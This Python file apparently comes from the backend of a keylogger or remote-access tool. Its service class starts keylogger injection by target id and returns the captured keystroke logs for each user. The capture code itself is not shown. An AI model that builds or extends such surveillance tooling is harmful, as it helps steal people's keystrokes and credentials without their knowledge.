from modules.KeyloggerModule import KeyloggerModule
from dataManager.repository.userRepository import UserRepository
from fastapi import HTTPException

class KeyloggerService:
    def __init__(self, keyloggerModule: KeyloggerModule, user_repository: UserRepository):
        self.keyloggerModule = keyloggerModule
        self.user_repository = user_repository

    async def start(self, id: str):
        return await self.keyloggerModule.inject(id)
    
    def get_keylogger_logs(self, user_id):
        user = self.user_repository.get_user(user_id)
        if not user:
             return {"error": "User not found"}
        return {
            "logs": user.module_data.get("keylogger")
        }